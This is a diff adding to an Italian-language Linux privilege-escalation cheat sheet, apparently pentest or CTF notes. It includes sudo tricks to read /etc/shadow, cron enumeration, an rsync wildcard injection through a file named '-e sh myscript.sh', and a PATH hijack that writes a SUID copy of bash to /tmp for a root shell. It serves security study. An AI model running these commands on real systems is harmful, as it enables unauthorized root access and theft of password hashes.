@@ -86,6 +86,7 @@ ls -aRl /etc/ | awk "$1 ~ /^.*r.*/
 ./strings /etc/shadow
 ```
 #### Comandi Sudo
+
 `sudo -l`
 User demo may run the following commands on crashlab:
 `(root) NOPASSWD: /usr/bin/vim`
@@ -98,3 +99,23 @@ User `hacker10` may run the following commands on admirer:
 ` sudo less /var/log/../../etc/shadow #Read shadow`
 ` sudo less /var/log/something /etc/shadow #Read 2 files`
 ## Cronjobs
+```sh
+crontab -l
+ls -la /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab/var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+```
+### Cronjobs : wildcards
+`rsync -a *.sh rsync://host.back/src/rbd`
+Possiamo creare un file chiamato "`-e sh myscript.sh`" così lo script eseguirà il nostro script
+**Se la wildcard è preceduta da `/some/path/*` allora non è vulnerabile**.
+### Abuso dei PATH
+Se puoi controllare qualcosa nella radice $PATH hai molto potere
+Esempio con cronjob:
+`* * * * root script.sh`
+Il percorso è:
+`PATH=/home/utente:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
+Sfrutta con:
+`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/utente/script.sh`
+`/tmp/bash -p`
+# Pivoting
+25
